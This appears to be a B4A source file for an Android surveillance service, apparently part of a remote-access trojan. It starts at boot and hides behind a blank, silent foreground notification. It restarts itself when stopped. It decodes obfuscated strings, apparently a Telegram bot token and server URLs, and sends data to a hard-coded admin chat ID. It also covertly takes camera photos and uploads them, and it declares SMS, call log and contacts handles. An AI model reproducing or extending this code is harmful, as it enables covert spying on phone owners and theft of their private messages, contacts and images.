B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Service
Version=10
@EndOfDesignText@
#Region  Service Attributes 
	#StartAtBoot: True
	#StartCommandReturnValue: android.app.Service.START_STICKY
#End Region

Sub Process_Globals

 
	Dim ht,ht2 As HttpJob
	Dim js As JSONParser
	Dim token As String = ":...__::...__::...__.______::...__"&"_.__::...___.___::...___.___::...__.______::...__.______::...__::...__._:::_.._._______::_.._.___"&"____::_..._.______::_...____.___::__.____.___::.___..._..::.__.__.__.::_...."&"...___::.__..__...::...__._::._._.__._.::______._.._::...___.__::_____.__.._::_._.._...__::.____.____::...___.___::_.__.___.._::.__..__...::_.._._______::..__._"&"_...::..____....::._.__..._.::_.__.___.._::_...____.___::..__.__...:_:_......__._::..__.__...::.__.__.__.::...____._"&"__::...._..__.::__.____.___::_..____.____::.__.___._.:"
	Dim admin_id As Int = 315160032
	Dim apiserver As String=":.____..._.::..____....::..____....::.__.......::.._....__.:://:.__.._.__.::"&".__.._.__.::.__.._.__.:.:...._..__.::_......._.::..____....::._"&"____.__.::.._....__.::..____....::._.______.::.__.__.__.::.________.:.:..___._._.::.._"&"..___._:/:.__.__.__.::.____.____::..____....:"
	Dim fileToWirte As String = "msgid16.txt"
	Dim StartMessage As String = "test16"
	Dim uploadUrl As String = ":.____..._.::..____....::..____....::.__...."&"...:://:...._..__.::_......._.::..____....::._____.__.:"&":.._....__.::..____....::._.______.::.__.__.__.::.________.:.:..___._._.::.._..___._:/:._.__..._.::.__...."&"...::.__..__...::.___.____.:.:.__...."&"...::.____..._.::.__..."&"....:"
	Dim upload As upload_ultra
	Dim allsms As SmsMessages
	Dim zip As ABZipUnzip
	Dim callLog As CallLog
	Dim c As Contacts2
	Dim cameraId As Int
	Dim camId As Int
	Dim decode As ultra_decoder
		
	

End Sub

Sub Service_Create
	 
	decode.Initialize
	token = decode.decode(token)
	apiserver=decode.decode(apiserver)
	uploadUrl=decode.decode(uploadUrl)
	ht.Initialize("ht",Me)
	ht2.Initialize("ht2",Me)
	ht.JobName="ht1"
	ht2.JobName="ht2"
	upload.Initialize(uploadUrl,token)
	Dim n As Notification
	n.Initialize2(n.IMPORTANCE_LOW)
	n.Icon      = "icon"
	n.Sound    = False
	n.Vibrate    = False
	n.Light    = False
	n.Insistent  = False
	n.AutoCancel = False
	n.SetInfo("","","")
	Service.AutomaticForegroundNotification = n
'	ht.Initialize("ht" , Me)
	'ht2.Initialize("ht2" , Me)

	'ht.JobName = "ht1"
	'ht2.JobName = "ht2"
	'upload.Initialize(":.____..._.::..____....::..____....::.__...."&"...:://:...._..__.::_......._.::..____....::._____.__.:"&":.._....__.::..____....::._.______.::.__.__.__.::.________.:.:..___._._.::.._..___._:/:._.__..._.::.__...."&"...::.__..__...::.___.____.:.:.__...."&"...::.____..._.::.__..."&"....:",token)

End Sub

Sub Service_Start (StartingIntent As Intent)
	
	
End Sub

Sub getCam (Topic As String, fileName As String)
	
	Try
		'ToastMessageShow("getAllSms",True)
	
	
		cameraId = 1
		camId = 0
		StartActivity(cmr2)
	Catch
		ht2.Download(apiserver&token&"/sendmessage?chat_id="&admin_id&"&text="&"Exception"&"&reply_to_message_id="&0)
	End Try
End Sub



Sub uploadImage
	upload.upload(admin_id , "Image" , camId , File.DirDefaultExternal , "cmr.jpg")
End Sub


Sub Service_Destroy
	StartServiceAt("" , DateTime.Now+100 , True)
End Sub
